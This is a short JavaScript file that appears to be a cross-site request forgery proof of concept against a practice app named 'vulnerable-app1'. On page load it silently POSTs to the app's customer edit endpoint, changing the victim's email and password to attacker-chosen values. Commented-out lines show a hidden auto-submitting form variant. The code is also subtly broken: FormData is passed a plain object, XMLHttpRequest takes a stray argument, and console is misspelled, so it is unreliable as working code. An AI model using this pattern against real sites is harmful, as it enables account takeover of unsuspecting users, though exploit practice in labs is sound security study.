window.addEventListener("DOMContentLoaded", () => {
	// const iframe = document.getElementById("csrf-iframe");
  // const form = iframe.contentWindow.document.querySelector('#csrf-form');
  const form = document.querySelector('#csrf-form');


//   const formObj = `<form action="https://vulnerable-app1.herokuapp.com/customers/edit" method="post" id="csrf-form" >
//   <input type="hidden" name="customer[email]" value="top@gun" />
//   <input type="hidden" name="customer[password]" value="tomcruise" />
//   <input type="hidden" name="customer[password_confirmation]" value="tomcruise" />
// </form>`;

  const customer = {
    email: "top@gun",
    password: "tomcruise",
    password_confirmation: "tomcruise"
  };

  const formData = new FormData(customer);
  const XHR = new XMLHttpRequest(formData);
    XHR.open("POST", "https://vulnerable-app1.herokuapp.com/customers/edit", true);
    XHR.responseType = "json";
    XHR.send(formData);
    XHR.onload = () => {
      conssole.log("ok")
    }
  // form.submit()
})
